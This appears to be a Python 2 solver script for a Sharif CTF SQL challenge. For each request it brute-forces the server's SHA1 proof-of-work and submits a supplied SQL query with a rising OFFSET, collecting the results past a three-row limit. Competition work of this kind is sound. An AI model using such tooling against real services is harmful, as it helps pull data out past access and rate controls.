#!/usr/bin/python

import requests
import hashlib
import itertools
import sys

query = sys.argv[1].strip()

offset = 0

url = 'http://ctf.sharif.edu:36455/chal/sql/'

s = requests.Session()
r = s.get(url)

print "[*] Session begun, fetching all results for query: " + query

while True:
	rowcount = 0
	for line in r.content.splitlines():
		if 'Nonce' in line:
			nonce = line.split()[1]

	charset = "".join([chr(x) for x in range(128)])

	for comb in itertools.combinations(charset,5):
		test = "".join(comb) + nonce
		ha = hashlib.sha1()
		ha.update(test)

		if ha.hexdigest()[0:5] == "00000":	
			thepow = "".join(comb)
			break

	data = { 'pow' : thepow, 'sql' : query + ' offset ' + str(offset), 'submit': 'Run' }

	r = s.post(url, data=data)

	validpow = False

	for line in r.content.splitlines():
		if "Invalid POW" in line:
			print "[-] POW Wrong."
			quit()
		
		if "Valid POW" in line:
			validpow = True
	
		if "Search is not allowed" in line:
			print "[-] Query was denied: Search is not allowed."
			quit()

		if validpow == True:
			if '<td>' in line:
				rowcount += 1
				print line.replace('<td>','').replace('</td>','')

	if rowcount < 3:
		print "[*] End of query output"
		quit()

	offset += 3
